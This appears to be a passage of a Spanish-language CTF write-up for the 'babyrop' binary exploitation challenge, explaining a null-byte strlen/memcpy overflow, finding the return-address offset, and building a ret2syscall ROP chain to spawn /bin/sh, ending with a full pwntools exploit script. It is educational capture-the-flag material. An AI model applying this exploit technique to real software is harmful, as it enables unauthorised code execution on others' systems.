href=/ctf/picoctf/binaryexplotation/two-sum/>two-sum</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/ctf/picoctf/binaryexplotation/vne/>VNE</a></li></ul></div></li></ul></div></li></ul></nav></div><nav class="docs-toc docs-toc-offset d-none d-xl-block col-xl-3" aria-label="Secondary navigation"><div class=page-links><h3>On this page</h3><nav id=toc><ul><li><ul><li><a href=#analysis>Analysis</a><ul><li><a href=#main-function>Main function</a></li><li><a href=#input-function>Input function</a></li></ul></li><li><a href=#exploitation>Exploitation</a><ul><li><a href=#offset>Offset</a></li><li><a href=#ret2syscall>ret2syscall</a></li></ul></li><li><a href=#exploit-entero>Exploit entero</a></li></ul></li></ul></nav></div></nav><main class="docs-content col-lg-11 col-xl-9"><nav aria-label=breadcrumb><ol class=breadcrumb><li class=breadcrumb-item><a href=/>Home</a></li><li class=breadcrumb-item><a href=/ctf/>Ctf</a></li><li class=breadcrumb-item><a href=/ctf/nohacknoctf/>No Hack No CTF</a></li><li class="breadcrumb-item active" aria-current=page>babyrop</li></ol></nav><div style=display:flex;align-items:center><h1 style=margin:0;vertical-align:middle>babyrop</h1></div><nav class="toc-mobile d-xl-none" aria-label="Quaternary navigation"><details><summary>On this page</summary><div class=page-links><nav id=TableOfContents><ul><li><ul><li><a href=#analysis>Analysis</a><ul><li><a href=#main-function>Main function</a></li><li><a href=#input-function>Input function</a></li></ul></li><li><a href=#exploitation>Exploitation</a><ul><li><a href=#offset>Offset</a></li><li><a href=#ret2syscall>ret2syscall</a></li></ul></li><li><a href=#exploit-entero>Exploit entero</a></li></ul></li></ul></nav></div></details></nav><div style=display:flex;align-items:center;vertical-align:middle></div><br><p><small>July 10, 2025<span class="stretched-link position-relative reading-time" title="Estimated reading time"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M3 12a9 9 0 1018 0A9 9 0 003 12"/><path d="M12 7v5l3 3"/></svg>5&nbsp;minutes</span></small></p><h2 id=analysis>Analysis<a href=#analysis class=anchor aria-hidden=true>#</a></h2><h3 id=main-function>Main function<a href=#main-function class=anchor aria-hidden=true>#</a></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kt>bool</span> <span class=nf>main</span><span class=p>(</span><span class=n>EVP_PKEY_CTX</span> <span class=o>*</span><span class=n>param_1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=kt>bool</span> <span class=n>bVar1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>undefined8</span> <span class=n>local_38</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>undefined8</span> <span class=n>local_30</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>undefined8</span> <span class=n>local_28</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>undefined8</span> <span class=n>local_20</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=kt>int</span> <span class=n>local_c</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  
</span></span><span class=line><span class=cl>  <span class=nf>init</span><span class=p>(</span><span class=n>param_1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>local_38</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>local_30</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>local_28</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>local_20</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;What</span><span class=se>\&#39;</span><span class=s>s your name?&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>local_c</span> <span class=o>=</span> <span class=nf>input</span><span class=p>(</span><span class=o>&amp;</span><span class=n>local_38</span><span class=p>,</span><span class=mh>0x20</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>bVar1</span> <span class=o>=</span> <span class=n>local_c</span> <span class=o>==</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span><span class=n>bVar1</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;Hello, %s!</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span><span class=o>&amp;</span><span class=n>local_38</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;Invalid name!&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=o>!</span><span class=n>bVar1</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>En la función main básicamente se hace un puts y luego se llama a la función input pasándole la dirección de local_38 y 0x20, luego printea el valor de local_38.</p><h3 id=input-function>Input function<a href=#input-function class=anchor aria-hidden=true>#</a></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl>  <span class=k>do</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>sVar2</span> <span class=o>=</span> <span class=nf>read</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span><span class=o>&amp;</span><span class=n>local_11</span><span class=p>,</span><span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>((</span><span class=n>sVar2</span> <span class=o>==</span> <span class=mi>0</span><span class=p>)</span> <span class=o>||</span> <span class=p>(</span><span class=n>local_11</span> <span class=o>==</span> <span class=sc>&#39;\n&#39;</span><span class=p>))</span> <span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>pcVar1</span> <span class=o>=</span> <span class=p>(</span><span class=kt>char</span> <span class=o>*</span><span class=p>)((</span><span class=kt>long</span><span class=p>)</span><span class=o>&amp;</span><span class=n>local_98</span> <span class=o>+</span> <span class=n>local_10</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>local_10</span> <span class=o>=</span> <span class=n>local_10</span> <span class=o>+</span> <span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=o>*</span><span class=n>pcVar1</span> <span class=o>=</span> <span class=n>local_11</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span> <span class=k>while</span> <span class=p>(</span><span class=n>local_10</span> <span class=o>!=</span> <span class=mh>0x80</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>sVar3</span> <span class=o>=</span> <span class=nf>strlen</span><span class=p>((</span><span class=kt>char</span> <span class=o>*</span><span class=p>)</span><span class=o>&amp;</span><span class=n>local_98</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span><span class=n>param_2</span> <span class=o>&gt;=</span> <span class=n>sVar3</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nf>memcpy</span><span class=p>(</span><span class=n>param_1</span><span class=p>,</span><span class=o>&amp;</span><span class=n>local_98</span><span class=p>,</span><span class=n>local_10</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=n>param_2</span> <span class=o>&lt;</span> <span class=n>sVar3</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>Esto es una función personalizada para leer el input de un usuario, para que se entienda mejor se le pueden cambiar los nombres a las variables</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl>  <span class=k>do</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>sVar2</span> <span class=o>=</span> <span class=nf>read</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span><span class=o>&amp;</span><span class=n>caracter</span><span class=p>,</span><span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>((</span><span class=n>sVar2</span> <span class=o>==</span> <span class=mi>0</span><span class=p>)</span> <span class=o>||</span> <span class=p>(</span><span class=n>caracter</span> <span class=o>==</span> <span class=sc>&#39;\n&#39;</span><span class=p>))</span> <span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>pcVar1</span> <span class=o>=</span> <span class=p>(</span><span class=kt>char</span> <span class=o>*</span><span class=p>)((</span><span class=kt>long</span><span class=p>)</span><span class=o>&amp;</span><span class=n>buffer_entrada</span> <span class=o>+</span> <span class=n>length</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>length</span> <span class=o>=</span> <span class=n>length</span> <span class=o>+</span> <span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=o>*</span><span class=n>pcVar1</span> <span class=o>=</span> <span class=n>caracter</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span> <span class=k>while</span> <span class=p>(</span><span class=n>length</span> <span class=o>!=</span> <span class=mh>0x80</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>lenght_real</span> <span class=o>=</span> <span class=nf>strlen</span><span class=p>((</span><span class=kt>char</span> <span class=o>*</span><span class=p>)</span><span class=o>&amp;</span><span class=n>buffer_entrada</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span><span class=n>max_lenght</span> <span class=o>&gt;=</span> <span class=n>lenght_real</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nf>memcpy</span><span class=p>(</span><span class=n>result_input</span><span class=p>,</span><span class=o>&amp;</span><span class=n>buffer_entrada</span><span class=p>,</span><span class=n>length</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=n>max_lenght</span> <span class=o>&lt;</span> <span class=n>lenght_real</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>La función lee caracteres uno por uno desde la entrada estándar utilizando read. En cada iteración:</p><p>Lee un byte (un carácter) y lo guarda en carácter.</p><p>Si read devuelve 0 (EOF) o el carácter leído es &lsquo;\n&rsquo; (salto de línea), se rompe el bucle.</p><p>Si no, se guarda el carácter en el buffer buffer_entrada en la posición actual (length), y se incrementa length.</p><p>El bucle para al leer 128 caracteres (0x80) como máximo, o si se encuentra un salto de línea antes.</p><p>Luego, se calcula la longitud real de la cadena utilizando strlen, que mide hasta el primer byte nulo (&rsquo;\0&rsquo;). Después, se compara con max_lenght (el tamaño máximo permitido pasado por el argumento). Si la longitud real es menor o igual a max_lenght, se copia el contenido del buffer al resultado (result_input).</p><p>Finalmente, la función devuelve 1 si el input superó el tamaño máximo permitido (max_lenght), y 0 en caso contrario.</p><p>Ejemplo:</p><pre tabindex=0><code>User input: Hola\x00Adios

Strlen mediría el length de esa string 

H o l a \x00 A d i o s
1 2 3 4

Total length: 4
</code></pre><p>Entonces al hacer un memcpy de memcpy(addr destino, input (Hola\x00Adios), lenght (4)), se estaría copiando una cadena más larga de lo esperado en la dirección de destino causando un desbordamiento del buffer.</p><h2 id=exploitation>Exploitation<a href=#exploitation class=anchor aria-hidden=true>#</a></h2><h3 id=offset>Offset<a href=#offset class=anchor aria-hidden=true>#</a></h3><p>Con la lógica de <a href=#analysis>Analysis</a> se puede conseguir desbordar el buffer. El input esperado era de 0x20 (32 caracteres) así que el payload será 31 &lsquo;A&rsquo; un null byte y muchas &lsquo;B&rsquo;. strlen solo medirá el lenght hasta el null byte y con las &lsquo;B&rsquo; se va a desbordar el buffer</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;A&#39;</span><span class=o>*</span><span class=mi>31</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=sa>b</span><span class=s1>&#39;B&#39;</span><span class=o>*</span><span class=mi>100</span>
</span></span><span class=line><span class=cl><span class=n>info</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>r</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=s1>&#39;name?&#39;</span><span class=p>,</span> <span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>r</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>python3 solve.py LOCAL
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA<span class=se>\x</span>00BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Got EOF <span class=k>while</span> reading in interactive
</span></span><span class=line><span class=cl>$ 
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Interrupted
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Process <span class=s1>&#39;/home/d3bo/Desktop/pwn/main&#39;</span> stopped with <span class=nb>exit</span> code -11 <span class=o>(</span>SIGSEGV<span class=o>)</span> <span class=o>(</span>pid 24976<span class=o>)</span>
</span></span></code></pre></div><p>Se ha desbordado el buffer, el siguiente objetivo es conocer el offset hasta el RIP (la cantidad de B que hay que poner hasta llegar a sobreescribir el RIP).</p><pre tabindex=0><code>$ pwn cyclic 128
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaab
</code></pre><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;A&#39;</span><span class=o>*</span><span class=mi>31</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=sa>b</span><span class=s1>&#39;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaab&#39;</span>
</span></span></code></pre></div><pre tabindex=0><code class=language-bahs data-lang=bahs>python3 solve.py LOCAL GD
</code></pre><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>00:0000│ rsp 0x7ffdec739f18 ◂— 0x6161616861616167 <span class=o>(</span><span class=s1>&#39;gaaahaaa&#39;</span><span class=o>)</span>
</span></span><span class=line><span class=cl>01:0008│     0x7ffdec739f20 ◂— 0x6161616a61616169 <span class=o>(</span><span class=s1>&#39;iaaajaaa&#39;</span><span class=o>)</span>
</span></span><span class=line><span class=cl>02:0010│     0x7ffdec739f28 ◂— 0x6161616c6161616b <span class=o>(</span><span class=s1>&#39;kaaalaaa&#39;</span><span class=o>)</span>
</span></span><span class=line><span class=cl>03:0018│     0x7ffdec739f30 ◂— 0x6161616e6161616d <span class=o>(</span><span class=s1>&#39;maaanaaa&#39;</span><span class=o>)</span>
</span></span><span class=line><span class=cl>04:0020│     0x7ffdec739f38 ◂— 0x616161706161616f <span class=o>(</span><span class=s1>&#39;oaaapaaa&#39;</span><span class=o>)</span>
</span></span><span class=line><span class=cl>05:0028│     0x7ffdec739f40 ◂— 0x6161617261616171 <span class=o>(</span><span class=s1>&#39;qaaaraaa&#39;</span><span class=o>)</span>
</span></span><span class=line><span class=cl>06:0030│     0x7ffdec739f48 ◂— 0x6161617461616173 <span class=o>(</span><span class=s1>&#39;saaataaa&#39;</span><span class=o>)</span>
</span></span><span class=line><span class=cl>07:0038│     0x7ffdec739f50 ◂— 0x6161617661616175 <span class=o>(</span><span class=s1>&#39;uaaavaaa&#39;</span><span class=o>)</span>
</span></span></code></pre></div><p>Los registros se han sobreescrito con la cadena generada con cyclic, sabiendo que al hacer un ret, el rip toma el valor del rsp, el próximo valor de rip será <code>gaaahaaa</code></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>pwn cyclic -l gaaa
</span></span><span class=line><span class=cl><span class=m>24</span>
</span></span></code></pre></div><p>El offset es 24.</p><p>Una vez conocido el offset, se podría pensar en cargar un shellcode y saltar a él, pero la protección NX está activada, por lo que no se pueden ejecutar shellcodes, tampoco se podría hacer un ret2libc porque el binario esta compilado de forma estática y no hay ninguna función de system para ejecutar comandos.</p><h3 id=ret2syscall>ret2syscall<a href=#ret2syscall class=anchor aria-hidden=true>#</a></h3><p>A base de gadgets se puede ir modificando los registros para conseguir hacer un syscall de execve (59) para ejecutar /bin/sh</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>pwndbg&gt; search /bin/sh
</span></span><span class=line><span class=cl>Searching <span class=k>for</span> byte: b<span class=s1>&#39;/bin/sh&#39;</span>
</span></span></code></pre></div><p>No hay ninguna cadena /bin/sh en el binario, se podría hacer un read para guardar /bin/sh en el bss, pero hay una forma más rápida y menos problemática</p><pre tabindex=0><code>$ROPgadget --binary main | grep &#39;mov qword ptr \[rdi\]&#39;

....
0x000000000043f04b : mov qword ptr [rdi], rax ; ret
....
</code></pre><p>Esto lo que hace es guardar el contenido de rax en el puntero que hay en rdi.</p><p>Antes:</p><p><img alt class="img-fluid lazyload blur-up" data-sizes=auto data-srcset="/ctf/nohacknoctf/binaryexploitation/babyrop01/images/before_hu224ffbe99be69282cb7b70c718d00b4e_86423_bcf520ed4ac430369284f99e927f9b52.webp 480w, /ctf/nohacknoctf/binaryexploitation/babyrop01/images/before_hu224ffbe99be69282cb7b70c718d00b4e_86423_7d1b4e89ded43110f6c6ff4e27e0fdab.webp 640w, /ctf/nohacknoctf/binaryexploitation/babyrop01/images/before_hu224ffbe99be69282cb7b70c718d00b4e_86423_43a5b4a068b20b2979747252fe6c9b63.webp 800w, /ctf/nohacknoctf/binaryexploitation/babyrop01/images/before_hu224ffbe99be69282cb7b70c718d00b4e_86423_7791bd59b444ae2395af2540860fb364.webp 1024w" fetchpriority=low height=900 id=h-rh-i-0 src=/ctf/nohacknoctf/binaryexploitation/babyrop01/images/before_hu224ffbe99be69282cb7b70c718d00b4e_86423_f49029290ebf21971a9a725316c6a2dd.webp width=1600></p><p>Después:</p><p><img alt class="img-fluid lazyload blur-up" data-sizes=auto data-srcset="/ctf/nohacknoctf/binaryexploitation/babyrop01/images/after_hu2a5f22fc1ab4357923b39a724ebcf4e8_62169_a21b472011436afe29df79eef68c75a5.webp 480w, /ctf/nohacknoctf/binaryexploitation/babyrop01/images/after_hu2a5f22fc1ab4357923b39a724ebcf4e8_62169_eb3fa7a410a92ae6c54cf8f51ba9a278.webp 640w, /ctf/nohacknoctf/binaryexploitation/babyrop01/images/after_hu2a5f22fc1ab4357923b39a724ebcf4e8_62169_ac70b89df51a05ef105f79602f818d01.webp 800w, /ctf/nohacknoctf/binaryexploitation/babyrop01/images/after_hu2a5f22fc1ab4357923b39a724ebcf4e8_62169_376fb8ba1f055135a89fcdaedb8d569c.webp 1024w" fetchpriority=low height=900 id=h-rh-i-1 src=/ctf/nohacknoctf/binaryexploitation/babyrop01/images/after_hu2a5f22fc1ab4357923b39a724ebcf4e8_62169_5646b84d848202deb0af47f23a3a9ffd.webp width=1600></p><p>Para poner rsi en 0 el mejor gadget es <code>pop rsi ; pop rbp ; ret</code>, y para cargar 59 en rax el mejor gadget es <code>pop rax ; ret</code>. El payload quedaría de la siguiente forma</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl>    <span class=n>payload</span> <span class=o>=</span> <span class=n>flat</span><span class=p>(</span>
</span></span><span class=line><span class=cl>        <span class=sa>b</span><span class=s1>&#39;A&#39;</span> <span class=o>*</span> <span class=mi>31</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;B&#39;</span> <span class=o>*</span> <span class=n>offset</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=n>pop_rax</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;/bin/sh</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>,</span> <span class=n>mov_qword_ptr_rdi_rax</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=n>pop_rsi_pop_rbp</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=n>pop_rax</span><span class=p>,</span> <span class=mh>0x3b</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=n>syscall</span>
</span></span><span class=line><span class=cl>    <span class=p>)</span>
</span></span></code></pre></div><pre tabindex=0><code>$ python3 solve.py LOCAL

Hello, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA!
$ whoami
d3bo
$  
</code></pre><h2 id=exploit-entero>Exploit entero<a href=#exploit-entero class=anchor aria-hidden=true>#</a></h2><div class=highlight><pre tabindex=0 class=chroma><code class=language-py data-lang=py><span class=line><span class=cl><span class=ch>#!/usr/bin/env python3</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>HOST</span> <span class=o>=</span> <span class=s2>&#34;chal.78727867.xyz&#34;</span>
</span></span><span class=line><span class=cl><span class=n>PORT</span> <span class=o>=</span> <span class=mi>34000</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>exe</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=s2>&#34;./main&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>context</span><span class=o>.</span><span class=n>binary</span> <span class=o>=</span> <span class=n>exe</span>
</span></span><span class=line><span class=cl><span class=n>context</span><span class=o>.</span><span class=n>terminal</span> <span class=o>=</span> <span class=p>[</span><span class=s1>&#39;tmux&#39;</span><span class=p>,</span> <span class=s1>&#39;splitw&#39;</span><span class=p>,</span> <span class=s1>&#39;-h&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=c1>#context.log_level = &#39;warn&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>gdb_script</span> <span class=o>=</span> <span class=s1>&#39;&#39;&#39;
</span></span></span><span class=line><span class=cl><span class=s1>b main
</span></span></span><span class=line><span class=cl><span class=s1>b *0x00000000004297c3
</span></span></span><span class=line><span class=cl><span class=s1>continue
</span></span></span><span class=line><span class=cl><span class=s1>&#39;&#39;&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>conn</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>args</span><span class=o>.</span><span class=n>LOCAL</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>r</span> <span class=o>=</span> <span class=n>process</span><span class=p>([</span><span class=n>exe</span><span class=o>.</span><span class=n>path</span><span class=p>])</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>args</span><span class=o>.</span><span class=n>GDB</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>gdb</span><span class=o>.</span><span class=n>attach</span><span class=p>(</span><span class=n>r</span><span class=p>,</span> <span class=n>gdbscript</span><span class=o>=</span><span class=n>gdb_script</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>r</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=n>HOST</span><span class=p>,</span> <span class=n>PORT</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>r</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>main</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>r</span> <span class=o>=</span> <span class=n>conn</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>offset</span> <span class=o>=</span> <span class=mi>24</span>
</span></span><span class=line><span class=cl>    <span class=n>mov_qword_ptr_rdi_rax</span> <span class=o>=</span> <span class=mh>0x000000000043f04b</span>
</span></span><span class=line><span class=cl>    <span class=n>pop_rax</span> <span class=o>=</span> <span class=mh>0x00000000004297c3</span>
</span></span><span class=line><span class=cl>    <span class=n>pop_rsi_pop_rbp</span> <span class=o>=</span> <span class=mh>0x0000000000403d5a</span>
</span></span><span class=line><span class=cl>    <span class=n>syscall</span> <span class=o>=</span> <span class=mh>0x00000000004025ea</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>payload</span> <span class=o>=</span> <span class=n>flat</span><span class=p>(</span>
</span></span><span class=line><span class=cl>        <span class=sa>b</span><span class=s1>&#39;A&#39;</span> <span class=o>*</span> <span class=mi>31</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;B&#39;</span> <span class=o>*</span> <span class=n>offset</span><span class=p>,</span> <span class=c1># JUNK</span>
</span></span><span class=line><span class=cl>        <span class=n>pop_rax</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;/bin/sh</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>,</span> <span class=n>mov_qword_ptr_rdi_rax</span><span class=p>,</span> <span class=c1># RDI apunta a /bin/sh</span>
</span></span><span class=line><span class=cl>        <span class=n>pop_rsi_pop_rbp</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=c1># RSI &amp; RBP = 0</span>
</span></span><span class=line><span class=cl>        <span class=n>pop_rax</span><span class=p>,</span> <span class=mh>0x3b</span><span class=p>,</span> <span class=c1># RAX = 59</span>
</span></span><span class=line><span class=cl>        <span class=n>syscall</span>
</span></span><span class=line><span class=cl>    <span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>r</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=s1>&#39;name?&#39;</span><span class=p>,</span> <span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>r</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s2>&#34;__main__&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>main</span><span class=p>()</span>
</span></span></code></pre></div><div class="page-footer-meta d-flex flex-column flex-md-row justify-content-between"></div><div class="page-nav d-flex flex-column flex-sm-row"><div class="card w-100"><div class="card-body d-flex"><div class="d-flex flex-column justify-content-center"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-arrow-left" width="20" height="20" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M5 12h14"/><path d="M5 12l6 6"/><path d="M5 12l6-6"/></svg></div><div class="d-flex flex-column"><div class=text-body-secondary>Prev</div><a href=/ctf/nohacknoctf/binaryexploitation/server_status/ class="stretched-link text-reset text-decoration-none">Server Status</a></div></div></div><div class=m-2></div><div class="card text-end w-100"><div class="card-body d-flex justify-content-end"><div class="d-flex flex-column"><div class=text-body-secondary>Next</div><a href=/ctf/picoctf/binaryexplotation/hijacking/ class="stretched-link text-reset text-decoration-none">Hijacking</a></div><div class="d-flex flex-column justify-content-center"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-arrow-right" width="20" height="20" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M5 12h14"/><path d="M13 18l6-6"/><path d="M13 6l6 6"/></svg></div></div></div></div></main></div></div></div><footer class="footer text-muted"><div class=container-lg><div class=row><div class="col-lg-8 text-center text-lg-start"><ul class=list-inline><li class=list-inline-item><a class=text-muted 